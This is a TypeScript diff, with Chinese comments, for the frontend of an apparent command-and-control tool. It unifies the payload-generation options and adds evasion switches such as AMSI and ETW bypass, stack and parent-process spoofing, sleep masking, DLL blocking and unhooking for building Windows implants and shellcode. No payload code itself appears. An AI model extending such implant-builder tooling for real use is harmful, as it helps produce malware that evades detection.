@@ -186,18 +186,21 @@ export async function extractBlobError(error: any): Promise<string> {
   }
 }
 
-// GenServer 全流程：匹配监听器密钥 → 生成 → 下载
-// 返回 true=已下载；抛错=失败（错误文案可直接展示）
-// format: exe/dll/raw = 完整程序；bin/hex/c = 无阶段 shellcode（仅 windows）
-export async function generateClientBinary(opts: {
+// OPSEC 生成期配置（服务端 GenServer 消费）。
+// 值一律用字符串："1"/"0" 或枚举（none/direct/indirect、auto/ntc/apc/crt），
+// 留空 '' = 跟随服务端默认值（pkg/config 的 opsec 段 → 内置默认）。
+// 字段名与 Tshell-server/pkg/api/server.go 的 serverBody json tag 逐字对应，
+// 新增开关时三处必须同改：本类型 + OPSEC_FIELDS + ClientAPI.GenServer 的类型。
+export interface PayloadGenOptions {
   listener: string
   osType: string
   archType: string
   pass?: string
+  // format: exe/dll/raw = 完整程序；bin/hex/c = 无阶段 shellcode（仅 windows）
   format?: 'exe' | 'dll' | 'raw' | 'bin' | 'hex' | 'c'
   vkey?: string // 选择器携带的密钥（优先），否则按地址匹配
   encryptSalt?: string
-  // OPSEC 编译期配置（可选）
+  // ---- OPSEC 编译期开关 ----
   reconnectBaseDelay?: string
   reconnectMaxRetries?: string
   injectTech?: string
@@ -207,11 +210,56 @@ export async function generateClientBinary(opts: {
   amsiBypass?: string
   syscallMode?: string
   autoDelete?: string
+  sleepMaskHide?: string
+  stackSpoof?: string
+  ppidSpoof?: string
+  blockDLLs?: string
+  unhookOnStart?: string
   profileName?: string
+  userAgent?: string
   // 多传输端点列表（"scheme://addr,scheme://addr"）：非空时后端使用 multi 模板，
   // 客户端按端点顺序在运行时切换传输
   endpoints?: string
-}): Promise<boolean> {
+}
+
+// OPSEC_FIELDS 是"哪些开关必须进 GenServer 请求体"的唯一事实来源。
+// 曾经因为 generateClientBinary 与 generateClientBinaryBlob 各写一份 opts 类型，
+// blob 那份漏了 etwPatch/amsiBypass/syscallMode/autoDelete，前端四个开关成了
+// "UI 有、请求不带"的假开关（后端回落默认值，操作员以为打开了）。逐项转发 +
+// 单测锁字段，避免再犯。
+export const OPSEC_FIELDS: (keyof PayloadGenOptions)[] = [
+  'reconnectBaseDelay',
+  'reconnectMaxRetries',
+  'injectTech',
+  'masqueradeName',
+  'quietMode',
+  'etwPatch',
+  'amsiBypass',
+  'syscallMode',
+  'autoDelete',
+  'sleepMaskHide',
+  'stackSpoof',
+  'ppidSpoof',
+  'blockDLLs',
+  'unhookOnStart',
+  'userAgent',
+  'profileName',
+  'endpoints',
+]
+
+// opsFor 把 OPSEC 字段摊平成 GenServer 请求体的字符串值（缺省为 ''）
+export function opsFor(opts: PayloadGenOptions): Record<string, string> {
+  const out: Record<string, string> = {}
+  for (const k of OPSEC_FIELDS) {
+    const v = opts[k]
+    out[k as string] = typeof v === 'string' ? v : ''
+  }
+  return out
+}
+
+// GenServer 全流程：匹配监听器密钥 → 生成 → 下载
+// 返回 true=已下载；抛错=失败（错误文案可直接展示）
+export async function generateClientBinary(opts: PayloadGenOptions): Promise<boolean> {
   const blob = await generateClientBinaryBlob(opts)
   if (!blob) return false
   const isWin = opts.osType.toLowerCase() === 'windows'
@@ -231,22 +279,8 @@ export async function generateClientBinary(opts: {
 }
 
 // generateClientBinaryBlob 生成载荷并返回 Blob（不触发下载；供上传/注入迁移等流程复用）
-export async function generateClientBinaryBlob(opts: {
-  listener: string
-  osType: string
-  archType: string
-  pass?: string
-  format?: 'exe' | 'dll' | 'raw' | 'bin' | 'hex' | 'c'
-  vkey?: string
-  encryptSalt?: string
-  reconnectBaseDelay?: string
-  reconnectMaxRetries?: string
-  injectTech?: string
-  masqueradeName?: string
-  quietMode?: string
-  profileName?: string
-  endpoints?: string
-}): Promise<Blob | null> {
+// 注意：opts 必须复用 PayloadGenOptions（曾经两份类型漂移导致 4 个开关丢失）
+export async function generateClientBinaryBlob(opts: PayloadGenOptions): Promise<Blob | null> {
   let keys: { vkey: string; encryptSalt: string }
   if (opts.vkey && opts.encryptSalt) {
     keys = { vkey: opts.vkey, encryptSalt: opts.encryptSalt }
@@ -261,13 +295,8 @@ export async function generateClientBinaryBlob(opts: {
     vkey: keys.vkey,
     encryptSalt: keys.encryptSalt,
     format: opts.format,
-    reconnectBaseDelay: opts.reconnectBaseDelay || '',
-    reconnectMaxRetries: opts.reconnectMaxRetries || '',
-    injectTech: opts.injectTech || '',
-    masqueradeName: opts.masqueradeName || '',
-    quietMode: opts.quietMode || '',
-    profileName: opts.profileName || '',
-    endpoints: opts.endpoints || '',
+    // OPSEC 开关逐项转发（空串 = 跟随服务端默认）
+    ...opsFor(opts),
   })
   if (!res || res.status !== 200) {
     throw new Error('生成失败，请检查后端日志')
